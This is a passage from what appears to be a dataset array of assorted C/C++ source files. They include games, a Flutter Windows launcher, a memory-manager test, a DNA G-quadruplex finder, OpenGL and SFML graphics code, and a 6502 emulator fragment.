board[1][1] && board[1][1] == board[2][2]) {\r\n        return current_player;\r\n    }\r\n    if (board[0][2] == board[1][1] && board[1][1] == board[2][0]) {\r\n        return current_player;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nvoid swap_player_and_marker() {\r\n    if (current_marker == 'X') {\r\n        current_marker = 'O';\r\n    } else {\r\n        current_marker = 'X';\r\n    }\r\n\r\n    if (current_player == 1) {\r\n        current_player = 2;\r\n    } else {\r\n        current_player = 1;\r\n    }\r\n}\r\n\r\nvoid game() {\r\n    cout << \"Player 1, choose your marker: \";\r\n    char marker_p1;\r\n    cin >> marker_p1;\r\n\r\n    current_player = 1;\r\n    current_marker = marker_p1;\r\n\r\n    int player_won;\r\n\r\n    for (int i = 0; i < SIZE * SIZE; ++i) {\r\n        drawBoard();\r\n        cout << \"It's player \" << current_player << \"'s turn. Enter your slot: \";\r\n        int slot;\r\n        cin >> slot;\r\n\r\n        if (slot < 1 || slot > 9) {\r\n            cout << \"That slot is invalid! Try another slot!\" << endl;\r\n            --i;\r\n            continue;\r\n        }\r\n\r\n        if (!placeMarker(slot)) {\r\n            cout << \"That slot is occupied! Try another slot!\" << endl;\r\n            --i;\r\n            continue;\r\n        }\r\n\r\n        player_won = winner();\r\n        if (player_won == 1) {\r\n            cout << \"Player 1 won! Congratulations!\" << endl;\r\n            break;\r\n        }\r\n        if (player_won == 2) {\r\n            cout << \"Player 2 won! Congratulations!\" << endl;\r\n            break;\r\n        }\r\n\r\n        swap_player_and_marker();\r\n    }\r\n\r\n    if (player_won == 0) {\r\n        cout << \"It's a tie game!\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    game();\r\n    return 0;\r\n}\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"you_choose\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"os_mem.h\"\n\nint main(){\n\n    memory_manager_t mm;\n    setup_memory_manager(&mm);\n\n    mm.create(150,1); //expected: 1, passed\n    mm.alloc(1); //expected: mem_handle_t(0,1), passed\n    mm.alloc(2); //expected: mem_handle_t(1,2), passed\n    mm.alloc(3); //expected: mem_handle_t(3,3), passed\n    mm.print_blocks();\n    mm.alloc(4); //expected: mem_handle_t(6,4), passed\n    mm.alloc(100); //expected: mem_handle_t(10,100), passed\n    mm.free(mem_handle_t(0,1)); //expected: 1, passed\n    mm.free(mem_handle_t(1,2)); //expected: 1, passed\n    mm.free(mem_handle_t(3,3)); //expected: 1, passed\n    mm.alloc(20); //expected: mem_handle_t(110,20), passed\n    mm.alloc(100); //expected: mem_handle_t(0,0), passed\n    mm.alloc(1); //expected: mem_handle_t(130,1), passed\n    mm.get_max_block_size(); //expected: 19, passed\n    mm.get_free_space(); //expected: 25, passed\n    mm.free(mem_handle_t(130, 1)); //expected: 1, passed\n    mm.free(mem_handle_t(110,20)); //expected: 1, passed\n    mm.free(mem_handle_t(6,4)); //expected: 1, passed\n    mm.free(mem_handle_t(10,100)); //expected: 1, passed\n    mm.free(mem_handle_t(0,1)); //expected: 0, passed\n    mm.free(mem_handle_t(10,100)); //expected: 0, passed\n    mm.alloc(20); //expected: mem_handle_t(0,20), passed\n    mm.alloc(1); //expected: mem_handle_t(20,1), passed\n    mm.get_max_block_size(); //expected: 129, passed\n    mm.get_free_space(); //expected: 129, passed\n    mm.print_blocks();\n    mm.free(mem_handle_t(0,20)); //expected: 1, passed\n    mm.free(mem_handle_t(20,1)); //expected: 1, passed\n    mm.free(mem_handle_t(0,1)); //expected: 0, passed\n    mm.get_max_block_size(); //expected: 150, passed\n    mm.get_free_space(); //expected: 150, passed\n    mm.print_blocks();\n    mm.destroy(); //expected: 1, passed\n\n    return 0;\n}",
    "#include <iostream>\n#include <string>\n#include <queue>\n#include <cmath>\n#include <sstream>\n#include <ctime>\n#include <algorithm>\nusing namespace std;\n\n#include \"qgrs.h\"\n\nvoid seedQ(queue<G4Candidate> &, string, int);\nstd::vector<G4>::iterator select_best(vector<G4> fam);\nbool belongsin(G4 g4, vector<G4> family);\n\n\ninline int maximumLength (int numTetrads) {\n    return (numTetrads < 3)  ? 30 : 45;\n}\n\nG4Candidate:: G4Candidate(const string & sequence, short tetrads, nt start_pos) {\n    this->y1 = -1;\n    this->y2 = -1;\n    this->y3 = -1;\n    this->sequence = sequence;\n    this->numTetrads = tetrads;\n    this->start = start_pos;\n    this->tstring = \"\";\n    for ( int i = 0; i < tetrads; i++ ) tstring.append(\"C\");\n    this->maxLength = maximumLength(tetrads);\n}\n    \nstring G4Candidate:: toString() {\n    stringstream sstr;\n    sstr << \"Start = \" << start << \", numtetrads = \" << numTetrads;\n    return sstr.str();\n}\n\n\nshort G4Candidate:: partialLength() {\n    short length = numTetrads * 4;\n    // add the minimum loops left\n    if (y1 >= 0 && y2 <0 ) {\n        // only first loop is known\n        if (y1 == 0)\n            // other two must be at least 2\n            length += 2;\n        else\n            length += 1;\n    }\n    else if (y2 >= 0 && y3 <0) {\n        //first two loop lengths are known\n        if (y1 == 0 || y2 == 0 ) {\n            length+= 1;\n        }\n    }\n    // add the current loops\n    if (y1 > 0 ) length += y1;\n    if (y2 > 0 ) length += y2;\n    if (y3 > 0 ) length += y3;\n    return length;\n}\n\n    \nbool G4Candidate:: viable(int min_score) {\n    if (score() < min_score )\n        return false;\n    if (length() > maxLength )\n        return false;\n    // only one loop is allowed to have a 0 length\n    short count = 0;\n    if (y1 < 1) count+= 1;\n    if (y2 < 1) count+= 1;\n    if (y3 < 1) count+= 1;\n    return count < 2;\n}\n\nvoid G4Candidate:: findLoopLengthsFrom(queue<int> & ys, int i) {\n    int p = i;\n    bool done = false;\n    while (!done) {\n        p = sequence.find(tstring, p);\n        if (p < (start+maxLength+1) && p >= 0) {\n            int y = p - i;\n            if (y >= minAcceptableLoopLength() && (p-start+tstring.length()-1) < maxLength) {\n                ys.push(y);\n            }\n            else done = true;\n        }\n        else done = true;\n        p += 1;\n    }\n}\n\n\nvoid G4Candidate:: expand(queue<G4Candidate> &cands) {\n    queue<int> ys;\n    findLoopLengthsFrom(ys, cursor());\n    while (!ys.empty() ){\n        int y = ys.front();\n        ys.pop();\n        G4Candidate cand(sequence, numTetrads, start);\n        cand.y1 = y1;\n        cand.y2 = y2;\n        cand.y3 = y3;\n        if (y1 < 0 ) cand.y1 = y;\n        else if ( y2 < 0 ) cand.y2 = y;\n        else if ( y3 < 0 ) cand.y3 = y;\n\n        if (cand.partialLength() <= cand.maxLength )\n            cands.push(cand);\n    }\n}\n\n\n\nG4::G4() {}\nG4::G4(G4Candidate &candidate) {\n    start = candidate.start;\n    tetrads = candidate.numTetrads;\n    tetrad1 = candidate.t1();\n    tetrad2 = candidate.t2();\n    tetrad3 = candidate.t3();\n    tetrad4 = candidate.t4();\n    y1 = candidate.y1;\n    y2 = candidate.y2;\n    y3 = candidate.y3;\n    length = candidate.length();\n    gscore = candidate.score();\n    sequence = candidate.sequence.substr(candidate.start, candidate.length());\n}\n\nbool G4:: isequal(const G4 & other) {\n    if ( start != other.start ) return false;\n    if ( tetrads != other.tetrads ) return false;\n    if ( y1 != other.y1) return false;\n    if ( y2 != other.y2) return false;\n    if ( y3 != other.y3) return false;\n    return true;\n}\n    void G4:: makejson(string name, nt value, stringstream &out) {\n        out << \"\\\"\" << name << \"\\\": \" << value;\n    }\n    void G4:: makejson(string name, short value, stringstream &out) {\n        out << \"\\\"\" << name << \"\\\": \" << value;\n    }\n    void G4:: makejson(string name, string value, stringstream &out) {\n        out << \"\\\"\" << name << \"\\\": \\\"\" << value << \"\\\"\";\n    }\n    string G4:: toJSON(bool print_overlaps) {\n        stringstream out;\n        out << \"{\";\n        makejson(\"start\", start, out); out << \",\";\n        makejson(\"tetrad1\", tetrad1, out); out << \",\";\n        makejson(\"tetrad2\", tetrad2, out); out << \",\";\n        makejson(\"tetrad3\", tetrad3, out); out << \",\";\n        makejson(\"tetrad4\", tetrad4, out); out << \",\";\n        makejson(\"y1\", y1, out); out << \",\";\n        makejson(\"y2\", y2, out); out << \",\";\n        makejson(\"y3\", y3, out); out << \",\";\n        makejson(\"tetrads\", tetrads, out); out << \",\";\n        makejson(\"length\", length, out); out << \",\";\n        makejson(\"gscore\", gscore, out); out << \",\";\n        makejson(\"sequence\", sequence, out);\n        if ( print_overlaps ) {\n            out << \",\";\n            out << \"\\\"overlaps\\\":  [\";\n            int i = 0;\n            for ( vector<G4>::iterator git = overlaps.begin(); git != overlaps.end(); ++git) {\n                out << git->toJSON(false);\n                if ( ++i != overlaps.size()) {\n                    out << \",\";\n                }\n          ",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\nclass Node{\r\n    public:\r\n    int val;\r\n    Node* next;\r\n    Node(int val){\r\n        this->val=val;\r\n        this->next=NULL;\r\n    }\r\n};\r\nint size(Node* head){\r\n    Node* temp= head;\r\n    int count=0;\r\n    while(temp!=NULL){\r\n        temp=temp->next;\r\n        count++;\r\n    }\r\n    return count;\r\n}\r\nvoid print_linked_list(Node* head){\r\n    Node* temp_head=head;\r\n    while(temp_head!=NULL){\r\n        cout<<temp_head->val<<\" \";\r\n        temp_head=temp_head->next;\r\n    }\r\n    cout<<endl;\r\n}\r\nvoid insert_at_head(Node* &head,Node* &tail,int val){\r\n    Node* newnode=new Node(val);\r\n       if(head==NULL){\r\n        head=newnode;\r\n        tail=newnode;\r\n        return;\r\n       }\r\n       newnode->next=head;\r\n       head=newnode;\r\n} \r\nvoid insert_at_tail(Node* &head,Node* &tail,int val){\r\n    Node* newnode=new Node(val);\r\n    if(head==NULL&&tail==NULL){\r\n        head=newnode;\r\n        tail=newnode;\r\n        return;\r\n    }\r\n    tail->next=newnode;\r\n    tail=newnode;\r\n\r\n}\r\nvoid deletetion(Node* &head,Node* &tail,int pos){\r\n    if (head == NULL || pos < 0 || pos >= size(head)) {\r\n        return;\r\n    }\r\n    Node* temp = head;\r\n    if (pos == 0) {\r\n        Node* delete_node = head;\r\n        head = head->next;\r\n        if (head == NULL) {\r\n            tail = NULL; \r\n        }\r\n        delete delete_node;\r\n    } else {\r\n        for (int i = 1; i < pos; i++) {\r\n            temp = temp->next;\r\n        }\r\n        Node* delete_node = temp->next;\r\n        temp->next = temp->next->next;\r\n        if (temp->next == NULL) {\r\n            tail = temp;\r\n        }\r\n        delete delete_node;\r\n    }\r\n}\r\n    \r\nint main(){\r\n    Node* head=NULL;\r\n    Node* tail=NULL;\r\n    int q;\r\n    cin>>q;\r\n    while(q--){\r\n        int x,v;\r\n        cin>>x>>v;\r\n\r\n        if(x==0){\r\n            insert_at_head(head,tail,v);\r\n            print_linked_list(head);\r\n        }\r\n\r\n        else if(x==1){\r\n            insert_at_tail(head,tail,v);\r\n            print_linked_list(head);\r\n        }\r\n\r\n        else if(x==2){\r\n            if(v==0){\r\n                deletetion(head,tail,v);\r\n                print_linked_list(head);\r\n\r\n            }\r\n            else if(v!=size(head)&&v<size(head)){\r\n                deletetion(head,tail,v);\r\n                print_linked_list(head);\r\n            }\r\n            else{\r\n                print_linked_list(head);\r\n            }\r\n                \r\n        }\r\n    }\r\n    return 0;\r\n}",
    "// HelpDialog.cpp : implementation file\r\n//\r\n\r\n#include \"stdafx.h\"\r\n#include \"NetChess.h\"\r\n#include \"HelpDialog.h\"\r\n\r\n#ifdef _DEBUG\r\n#define new DEBUG_NEW\r\n#undef THIS_FILE\r\nstatic char THIS_FILE[] = __FILE__;\r\n#endif\r\n\r\n/////////////////////////////////////////////////////////////////////////////\r\n// CHelpDialog dialog\r\n\r\n\r\nCHelpDialog::CHelpDialog(CWnd* pParent /*=NULL*/)\r\n\t: CDialog(CHelpDialog::IDD, pParent)\r\n{\r\n\t//{{AFX_DATA_INIT(CHelpDialog)\r\n\tm_edit_string = _T(\"This is a solitaire game in cards and it is one type of memory test  game. Player has to remember the clicked cards. When clicked on a card and if any of the clicked card matches then click on the card to pair. Player has to make as many pair of cards with less fails and within short time. A pair can be made with any card of same symbol. For example Flower A can be paired to Flower A, Heart A, Diamond A or Spade A. \");\r\n\t//}}AFX_DATA_INIT\r\n}\r\n\r\n\r\nvoid CHelpDialog::DoDataExchange(CDataExchange* pDX)\r\n{\r\n\tCDialog::DoDataExchange(pDX);\r\n\t//{{AFX_DATA_MAP(CHelpDialog)\r\n\tDDX_Text(pDX, IDC_EDIT1, m_edit_string);\r\n\t//}}AFX_DATA_MAP\r\n}\r\n\r\n\r\nBEGIN_MESSAGE_MAP(CHelpDialog, CDialog)\r\n\t//{{AFX_MSG_MAP(CHelpDialog)\r\n\t//}}AFX_MSG_MAP\r\nEND_MESSAGE_MAP()\r\n\r\n/////////////////////////////////////////////////////////////////////////////\r\n// CHelpDialog message handlers\r\n\r\nBOOL CHelpDialog::OnInitDialog() \r\n{\r\n\tCDialog::OnInitDialog();\r\n\t\r\n\t// TODO: Add extra initialization here\r\n\t\r\n\treturn TRUE;  // return TRUE unless you set the focus to a control\r\n\t              // EXCEPTION: OCX Property Pages should return FALSE\r\n}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <sstream>\n#include <cmath>\n#include <math.h>\n\n#include <GL/glew.h>\n#include <GLFW/glfw3.h>\n\n#define _USE_MATH_DEFINES\n\n#define ASSERT(x) if (!(x)) __debugbreak();\n#define glCall(x) glClearError();\\\n    x;\\\n    ASSERT(glLogCall(#x, __FILE__, __LINE__));\n\nstatic void glClearError() \n{\n    while (glGetError());\n}\n\nstatic bool glLogCall(const char* function, const char* file, int line)\n{\n    if (GLenum err = glGetError()) \n    {\n        std::cout << \"[OpenGL Error] (0x\" << std::hex << err << \"):\" << function << \" \" << file << \":\" << std::dec << line << std::endl;\n        return false;\n    }\n    return true;\n}\n\nenum class ShaderType\n{\n    NONE = -1, VERTEX = 0, FRAGMENT = 1\n};\n\nstruct ShaderProgramSources\n{\n    std::string VertexSource;\n    std::string FragmentSource;\n};\n\nstatic ShaderProgramSources ParseShader(const std::string& filepath)\n{\n    std::ifstream stream(filepath);\n\n    std::string line;\n    std::stringstream ss[2];\n    ShaderType type = ShaderType::NONE;\n\n    while (getline(stream, line))\n    {\n        if (line.find(\"#shader\") != std::string::npos)\n        {\n            if (line.find(\"vertex\") != std::string::npos)\n            {\n                //set mode to vertex\n                type = ShaderType::VERTEX;\n\n            }\n            else if (line.find(\"fragment\") != std::string::npos)\n            {\n                //set mode to fragment\n                type = ShaderType::FRAGMENT;\n\n            }\n        }\n        else if (type != ShaderType::NONE) \n        {\n            ss[(int)type] << line << '\\n';\n        }\n    }\n    return { ss[0].str(), ss[1].str() };\n}\n\nstatic void LogShaderCompilationError(unsigned int type, unsigned int shader_id)\n{\n    int length;\n    std::string type_str = (type == GL_FRAGMENT_SHADER ? \"fragment\" : (type == GL_VERTEX_SHADER ? \"vertex\" : \"unrecognised\"));\n    glGetShaderiv(shader_id, GL_INFO_LOG_LENGTH, &length);\n    char* log = (char*)alloca(length * sizeof(char));\n    glGetShaderInfoLog(shader_id, length, &length, log);\n    std::cout << \"Compilation of \" << type_str << \" shader failed.\" << std::endl;\n    std::cout << log << std::endl;\n    glDeleteShader(shader_id);\n}\n\nstatic unsigned int CompileShader(unsigned int type, const std::string& source)\n{\n    unsigned int id = glCreateShader(type);\n    const char* src = source.c_str();\n    glShaderSource(id, 1, &src, nullptr);\n\n    glCompileShader(id);\n\n    int compilation_result;\n\n    glGetShaderiv(id, GL_COMPILE_STATUS, &compilation_result);\n\n    if (compilation_result != GL_TRUE)\n    {\n        LogShaderCompilationError(type, id);\n        return 0;\n    }\n\n    return id;\n\n}\n\nstatic void LogProgramError(const char *message, unsigned int program_id)\n{\n    std::cout << message << std::endl;\n    int length;\n    glGetProgramiv(program_id, GL_INFO_LOG_LENGTH, &length);\n    char* log = (char*)alloca(length * sizeof(char));\n    glGetProgramInfoLog(program_id, length, &length, log);\n    std::cout << log << std::endl;\n    glDeleteProgram(program_id);\n}\n\nstatic int CreateShaders(const std::string& vertexShader, const std::string& fragmentShader)\n{\n    unsigned int program = glCreateProgram();\n    unsigned int vs = CompileShader(GL_VERTEX_SHADER, vertexShader);\n    unsigned int fs = CompileShader(GL_FRAGMENT_SHADER, fragmentShader);\n\n    glAttachShader(program, vs);\n    glAttachShader(program, fs);\n    glLinkProgram(program);\n    glValidateProgram(program);\n\n    int validation_result, link_result;\n\n    glGetProgramiv(program, GL_VALIDATE_STATUS, &validation_result);\n    glGetProgramiv(program, GL_LINK_STATUS, &link_result);\n\n    if (link_result != GL_TRUE)\n    {\n        std::string message = \"Program link failed.\";\n        LogProgramError(message.c_str(), program);\n        return 0;\n    }\n\n    if (validation_result != GL_TRUE)\n    {\n        std::string message = \"Program validation failed.\";\n        LogProgramError(message.c_str(), program);\n        return 0;\n    }\n\n    glDeleteShader(vs);\n    glDeleteShader(fs);\n\n    return program;\n}\n\n\nint main(void)\n{\n    GLFWwindow* window;\n\n    /* Initialize the library */\n    if (!glfwInit())\n        return -1;\n\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n    /* Create a windowed mode window and its OpenGL context */\n    window = glfwCreateWindow(640, 640, \"Hello World\", NULL, NULL);\n    if (!window)\n    {\n        glfwTerminate();\n        return -1;\n    }\n\n    /* Make the window's context current */\n    glfwMakeContextCurrent(window);\n\n    if (glewInit() != GLEW_OK) {\n        printf(\"ERROR\");\n    }\n\n    std::cout << glGetString(GL_VERSION) << std::endl;\n\n   /* float positions[] = {\n        -0.5f,  0.5f,\n        -0.5f, -0.5f,\n         0.5f,  0.5f,\n         0.5f, -0.5f\n    };\n    unsigned int indices[]{\n        0, 1, 2,\n        1, 2, 3\n    };*/\n\n    float angle_inc = 10.0f;\n    float angle = 0.0f;\n    const float",
    "// CPP_TinhMenhGia.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\nint main()\n{\n    int sotien;\n    int so_to;\n    so_to = 0;\n    cout << \"Nhap so tien can rut. \"; cin >> sotien;\n    int menhgia[8] = { 500, 200, 100, 50, 20, 10, 5 ,1 };\n    \n        \n    for (int i = 0; i < 8; i++) {\n        if (sotien >= menhgia[i]) {\n            so_to = so_to + (sotien / menhgia[i]);\n            cout << \"So to menh gia \" << menhgia[i] << \" : \" << sotien / menhgia[i] << endl;\n            sotien = sotien - menhgia[i] * so_to;\n        }\n    }\n    cout << \"So to tien la: \" << so_to;\n    return 0;\n\n}\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "#include \"../Include/world.h\"\n\n#include <SFML/Graphics/RenderWindow.hpp>\n\n#include <algorithm>\n#include <cmath>\n\n\nWorld::World(sf::RenderWindow& window)\n\t: mWindow(window)\n\t, mWorldView(window.getDefaultView())\n\t, mTextures()\n\t, mSceneGraph()\n\t, mSceneLayers()\n\t, mWorldBounds(0.f, 0.f, mWorldView.getSize().x, 2000.f)\n\t, mSpawnPosition(mWorldView.getSize().x / 2.f, mWorldBounds.height - mWorldView.getSize().y / 2.f)\n\t, mScrollSpeed(-50.0f) \n\t, mPlayerAircraft(nullptr)\n{\n\tloadTextures();\n\tbuildScene();\n\n\t// Prepare the view\n\tmWorldView.setCenter(mSpawnPosition);\n}\n\nvoid World::update(sf::Time dt)\n{\n\t// Scroll the world, reset player velocity\n\tmWorldView.move(0.f, mScrollSpeed * dt.asSeconds());\n\tmPlayerAircraft->setVelocity(0.f, 0.f);\n\n\t// Forward commands to scene graph, adapt velocity (scrolling, diagonal correction)\n\twhile (!mCommandQueue.isEmpty())\n\t\tmSceneGraph.onCommand(mCommandQueue.pop(), dt);\n\t\n\tadaptPlayerVelocity();\n\n\t// Regular update step, adapt position (correct if outside view)\n\tmSceneGraph.update(dt);\n\tadaptPlayerPosition();\n}\n\nvoid World::draw()\n{\n\tmWindow.setView(mWorldView);\n\tmWindow.draw(mSceneGraph);\n}\n\nCommandQueue& World::getCommandQueue()\n{\n\treturn mCommandQueue;\n}\n\nvoid World::loadTextures()\n{\n\tmTextures.load(Textures::Eagle, \"Media/Textures/Eagle.png\");\n\tmTextures.load(Textures::Raptor, \"Media/Textures/Raptor.png\");\n\tmTextures.load(Textures::Desert, \"Media/Textures/Desert.png\");\n}\n\nvoid World::buildScene()\n{\n\t// Initialize the different layers\n\tfor (std::size_t i = 0; i < LayerCount; ++i)\n\t{\n\t\tSceneNode::Ptr layer(new SceneNode());\n\t\tmSceneLayers[i] = layer.get();\n\n\t\tmSceneGraph.attachChild(std::move(layer));\n\t}\n\n\t// Prepare the tiled background\n\tsf::Texture& texture = mTextures.get(Textures::Desert);\n\tsf::IntRect textureRect(mWorldBounds);\n\ttexture.setRepeated(true);\n\n\t// Add the background sprite to the scene\n\tstd::unique_ptr<SpriteNode> backgroundSprite(new SpriteNode(texture, textureRect));\n\tbackgroundSprite->setPosition(mWorldBounds.left, mWorldBounds.top);\n\tmSceneLayers[Background]->attachChild(std::move(backgroundSprite));\n\n\t// Add player's aircraft\n\tstd::unique_ptr<Aircraft> leader(new Aircraft(Aircraft::Eagle, mTextures));\n\tmPlayerAircraft = leader.get();\n\tmPlayerAircraft->setPosition(mSpawnPosition);\n\tmPlayerAircraft->setVelocity(40.f, mScrollSpeed);\n\tmSceneLayers[Air]->attachChild(std::move(leader)); \n\n\t\n\t// Add two escorting aircrafts, placed relatively to the main plane\n\tstd::unique_ptr<Aircraft> leftEscort(new Aircraft(Aircraft::Raptor, mTextures));\n\tleftEscort->setPosition(-80.f, 50.f);\n\tmPlayerAircraft->attachChild(std::move(leftEscort));\n\n\tstd::unique_ptr<Aircraft> rightEscort(new Aircraft(Aircraft::Raptor, mTextures));\n\trightEscort->setPosition(80.f, 50.f);\n\tmPlayerAircraft->attachChild(std::move(rightEscort));\n\n\tstd::unique_ptr<Aircraft> rightEscort2(new Aircraft(Aircraft::Raptor, mTextures));\n\trightEscort2->setPosition(160.f, 100.f);\n\tmPlayerAircraft->attachChild(std::move(rightEscort2));\n\t\n}\n\nvoid World::adaptPlayerPosition()\n{\n\t// \u00d1\u00eb\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e7\u00e0 \u00f2\u00e5\u00ec, \u00f7\u00f2\u00ee\u00e1\u00fb \u00e8\u00e3\u00f0\u00ee\u00ea \u00ed\u00e0\u00f5\u00ee\u00e4\u00e8\u00eb\u00f1\u00ff \u00e2 \u00ef\u00f0\u00e5\u00e4\u00e5\u00eb\u00e0\u00f5 \u00fd\u00ea\u00f0\u00e0\u00ed\u00e0, \u00ef\u00ee \u00ea\u00f0\u00e0\u00e9\u00ed\u00e5\u00e9 \u00ec\u00e5\u00f0\u00e5, \u00ed\u00e0 \u00f0\u00e0\u00f1\u00f1\u00f2\u00ee\u00ff\u00ed\u00e8\u00e8 \u00ed\u00e5\u00f1\u00ea\u00ee\u00eb\u00fc\u00ea\u00e8\u00f5 \u00e5\u00e4\u00e8\u00ed\u00e8\u00f6 \u00ee\u00f2 \u00e3\u00f0\u00e0\u00ed\u00e8\u00f6\u00fb\n\tsf::FloatRect viewBounds(mWorldView.getCenter() - mWorldView.getSize() / 2.f, mWorldView.getSize());\n\tconst float borderDistance = 40.f;\n\n\tsf::Vector2f position = mPlayerAircraft->getPosition();\n\tposition.x = std::max(position.x, viewBounds.left + borderDistance);\n\tposition.x = std::min(position.x, viewBounds.left + viewBounds.width - borderDistance);\n\tposition.y = std::max(position.y, viewBounds.top + borderDistance);\n\tposition.y = std::min(position.y, viewBounds.top + viewBounds.height - borderDistance);\n\tmPlayerAircraft->setPosition(position);\n}\n\nvoid World::adaptPlayerVelocity()\n{\n\tsf::Vector2f velocity = mPlayerAircraft->getVelocity();\n\n\t// \u00cf\u00f0\u00e8 \u00e4\u00e2\u00e8\u00e6\u00e5\u00ed\u00e8\u00e8 \u00ef\u00ee \u00e4\u00e8\u00e0\u00e3\u00ee\u00ed\u00e0\u00eb\u00e8 \u00f3\u00ec\u00e5\u00ed\u00fc\u00f8\u00e8\u00f2\u00e5 \u00f1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00fc (\u00f7\u00f2\u00ee\u00e1\u00fb \u00f1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00fc \u00e2\u00f1\u00e5\u00e3\u00e4\u00e0 \u00e1\u00fb\u00eb\u00e0 \u00ee\u00e4\u00e8\u00ed\u00e0\u00ea\u00ee\u00e2\u00ee\u00e9).\n\tif (velocity.x != 0.f && velocity.y != 0.f)\n\t\tmPlayerAircraft->setVelocity(velocity / std::sqrt(2.f));\n\n\t// \u00d3\u00e2\u00e5\u00eb\u00e8\u00f7\u00fc\u00f2\u00e5 \u00f1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00ea\u00f0\u00f3\u00f2\u00ea\u00e8\n\tmPlayerAircraft->accelerate(0.f, mScrollSpeed);\n}\n\n\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <iostream>\n\nusing Byte = unsigned char;\nusing Word = unsigned short;\n\nusing u32 = unsigned int;\n\n\n//memory\nstruct Mem{\n\n    static constexpr u32 MAX_MEM = 1024 *64;\n    Byte Data[MAX_MEM];\n\n    void Initialise(){\n        for(u32 i =0; i< MAX_MEM; i++){\n            Data[i] = 0;\n        }\n    }\n\n    // read 1 byte\n    Byte operator[](u32 Address) const{\n\n        // assert here Address is < MAX_MEM\n        return Data[Address];\n    }\n\n    // write 1 byte\n    Byte& operator[](u32 Address){\n\n        // assert here Address is < MAX_MEM\n        return Data[Address];\n    }\n\n    // write 2 bytes \n    void WriteWord(Word Value, u32 Address, u32 Cycles){\n        Data[Address] = Value & 0xFF; //LSB\n        Data[Address + 1] = (Value >> 8); // MSB \n        Cycles -= 2;\n    }\n\n};\n\n\nstruct CPU{\n\n    \n\n    Word PC; // Program Counter\n    Word SP; // Stack Pointer\n\n\n    Byte A, X, Y; // registers (Accumulator, Index Register X, Index Register Y)\n\n\n    // status flags -- bitfields (saves memory so that each flag uses one bit rather a whole byte)\n    Byte C : 1; // Carry Flags\n    Byte Z : 1; // Zero Flag\n    Byte I : 1; // Interrupt Disable\n    Byte D : 1; // Decimal Mode\n    Byte B : 1; // Break Command\n    Byte V : 1; // Overflow Flag\n    Byte N : 1; // Negative Flag\n\n\n    //turn on CPU\n    void Reset(Mem& memory){\n        PC = 0xFFFC; // initialise PC address\n        SP  = 0x0100; // initialise stack pointer address\n        C = Z = I = B = V = N = D = 0; // initialse flags to 0 \n        A = X = Y = 0; // initialise registers to 0\n\n        memory.Initialise();\n\n    }\n\n    Byte FetchByte(u32& Cycles, Mem& memory){\n        Byte Data = memory[PC]; //get data from PC\n        PC++; //Increment counter\n        Cycles--; //used up one cycle\n        return Data;\n    }\n\n\n    //fetch byte but without incrementing PC\n    Byte ReadByte(u32& Cycles, Byte Address, Mem& memory){\n        Byte Data = memory[Address]; //get data from PC\n        Cycles--; //used up one cycle\n        return Data;\n    }\n\n    Word FetchWord(u32& Cycles, Mem& memory){\n        \n        //6502 is little endian (first byte read is the LSB of data)\n        Word Data = memory[PC]; //get data from PC\n        PC++; //Increment counter\n\n        Data |= (memory[PC] << 8); //shift by 8 bytes and or with result\n        PC++; //Increment counter\n        \n        Cycles-=2; //used up one cycle\n        return Data;\n    }\n\n\n    //opcodes\n    static constexpr Byte \n        INS_LDA_IM = 0xA9, // Load Accumulator with Immediate\n        INS_LDA_ZP = 0xA5, // Load Accumulator with Zero Page (first 256 bytes of memory) \n        INS_LDA_ZPX = 0xB5, // Load Accumulator with given zero page address and adding the current value of X to the address\n        INS_JSR = 0x20, // Jump to Subroutine\n        ;\n\n    void LDAStatus(){\n        Z = (A == 0); // zero flag is set if A == 0\n        N = (A & 0b10000000) > 0; // negative flag set if bit 7 of Acc is set\n    }\n\n    // Cycles: number of cycles needed to execute some instruction\n    void Execute(u32 Cycles, Mem& memory){\n        \n        while( Cycles > 0){\n            //fetch next instruction\n            Byte Ins = FetchByte( Cycles, memory ); // 1 clock cycle\n            switch (Ins){\n                \n                // executes the load accumulator with immediate instruction  \n                case 